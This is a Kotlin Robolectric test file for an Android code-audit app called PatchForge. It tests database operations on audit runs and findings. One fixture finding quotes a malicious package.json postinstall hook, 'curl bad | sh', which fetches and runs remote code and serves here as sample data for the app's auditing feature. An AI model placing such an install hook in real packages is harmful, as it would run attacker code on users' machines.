package com.example

import android.content.Context
import androidx.test.core.app.ApplicationProvider
import com.example.data.AppDatabase
import com.example.data.DatabaseModule
import com.example.data.local.AuditFinding
import com.example.data.local.AuditRunEntity
import com.example.data.local.PatchStatus
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.test.runTest
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [36])
class ExampleRobolectricTest {

    private var testDb: AppDatabase? = null

    @After
    fun tearDown() {
        testDb?.close()
        testDb = null
    }

    @Test
    fun `read app name string from context`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val appName = context.getString(R.string.app_name)
        assertEquals("PatchForge", appName)
    }

    @Test
    fun `AuditFindingDao and DatabaseModule support insert query update and delete`() = runTest {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val db = AppDatabase.createInMemory(context)
        testDb = db

        val patchForgeDao = DatabaseModule.providePatchForgeDao(db)
        val findingDao = DatabaseModule.provideAuditFindingDao(db)

        patchForgeDao.insertAuditRun(
            AuditRunEntity(
                runId = "RUN-TEST-1",
                title = "package.json",
                filePath = "package.json",
                engineMode = "DUAL_ENGINE",
                inputPayload = "{}",
                modelId = "gemini-4-hydrogen",
                highThinkingEnabled = false,
                summary = "Test audit",
                riskScore = 82,
                maxNestingDepth = 2,
                cyclomaticPeak = 4,
                astHotspots = "install",
                syncStatus = "LOCAL_ENGINE"
            )
        )

        val f1 = AuditFinding(
            id = "RUN-TEST-1-F1",
            runId = "RUN-TEST-1",
            filePath = "package.json",
            lineBounds = "L4-L4",
            threatCategory = "INSTALL_SCRIPT",
            severity = "CRITICAL",
            description = "Malicious postinstall command",
            replacementSnippet = "\"postinstall\": \"\"",
            originalSnippet = "\"postinstall\": \"curl bad | sh\""
        )
        val f2 = AuditFinding(
            id = "RUN-TEST-1-F2",
            runId = "RUN-TEST-1",
            filePath = "src/Auth.kt",
            lineBounds = "L20-L25",
            threatCategory = "SEMANTIC_LOGIC",
            severity = "MEDIUM",
            description = "Unchecked token expiry",
            replacementSnippet = "require(expiresAt > now)"
        )

        findingDao.insert(f1)
        findingDao.insertAll(listOf(f2))

        val all = findingDao.getAllFindings().first()
        assertEquals(2, all.size)
        assertEquals("CRITICAL", all.first().severity)

        val criticalOnly = findingDao.getFindingsBySeverity("CRITICAL").first()
        assertEquals(1, criticalOnly.size)
        assertEquals("RUN-TEST-1-F1", criticalOnly.first().id)

        findingDao.updatePatchStatus("RUN-TEST-1-F1", PatchStatus.APPROVED)
        val reloaded = findingDao.getFindingById("RUN-TEST-1-F1")
        assertNotNull(reloaded)
        assertEquals(PatchStatus.APPROVED, reloaded?.patchStatus)

        findingDao.deleteById("RUN-TEST-1-F1")
        assertNull(findingDao.getFindingById("RUN-TEST-1-F1"))

        findingDao.delete(f2)
        assertEquals(0, findingDao.getAllFindings().first().size)
    }
}
